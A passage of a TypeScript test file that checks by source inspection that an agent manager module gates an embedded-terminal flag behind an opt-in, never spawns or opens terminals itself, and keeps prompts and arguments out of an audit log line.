    for (const p of candidates) if (fs.existsSync(p)) return p
    throw new Error(`source not found: ${candidates.join(" | ")}`)
  }
  const managerSrc = () => fs.readFileSync(srcFile("acp", "manager.ts"), "utf8")
  /**
   * Count CODE, not prose. A comment that merely mentions `embed: true` is not a call site, so the
   * "exactly one" lock must not be satisfiable (or breakable) by wording. Block comments are
   * stripped before line comments so a `/* … *\/` body cannot leave a dangling `//` behind.
   */
  const codeOnly = (src: string) =>
    src.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/[^\n]*/g, "")

  it("passes embed:true only inside the open_local_terminal_snapshot opt-in branch", () => {
    const code = codeOnly(managerSrc())
    const branch = code.slice(code.indexOf("private maybeOpenLocalTerminal"))
    const optIn = branch.indexOf("open_local_terminal_snapshot !== true")
    const embedFlag = branch.indexOf("embed: true")
    assert.ok(optIn > -1, "Mode C opt-in early return must exist")
    assert.ok(embedFlag > -1, "embed: true must exist")
    assert.ok(optIn < embedFlag, "embed: true must sit after the opt-in early return")
    assert.equal(
      code.split("embed: true").length - 1,
      1,
      "exactly one embed: true, paired with the eligibility expression",
    )
    assert.match(branch, /\.\.\.\(embedEligible \? \{ embed: true \} : \{\}\)/)
    assert.match(
      branch,
      /const embedEligible =\s*\n?\s*getConfig\(\)\.embedded_terminal\?\.enabled === true && process\.platform === "darwin"/,
    )
    // The only embedded_terminal read in the manager is that eligibility expression, so there is
    // no config-driven cancellation of the outer terminal.
    assert.equal(code.split("embedded_terminal").length - 1, 1)
    assert.equal(code.split("openLocalTerminalForAgent(").length - 1, 1)
    assert.doesNotMatch(branch, /if \(embedEligible\)/)
  })

  it("never spawns a PTY, opens a tab or a host terminal from the manager", () => {
    const src = managerSrc()
    for (const forbidden of [
      "spawnPtySession",
      "openDarwinWithPref",
      "openDarwinTerminalApp",
      "osascript",
      "open -na",
      "Alacritty",
      "isPtyBusy",
    ]) {
      assert.ok(!src.includes(forbidden), `manager must not reference ${forbidden}`)
    }
  })

  it("the embed audit log call carries no prompt or argv payload", () => {
    const src = managerSrc()
    const start = src.indexOf('logger.info("acp.mode_c_embed_intent"')
    assert.ok(start > -1, "embed audit log call must exist")
    const block = src.slice(start, src.indexOf("})", start))
    assert.match(block, /thread_id/)
    assert.match(block, /agent_file_basename/)
    assert.match(block, /argv_argc/)
    assert.match(block, /cwd/)
    assert.doesNotMatch(block, /prompt/i)
    assert.doesNotMatch(block, /\bargs\b/)
    assert.doesNotMatch(block, /task/i)
  })
})
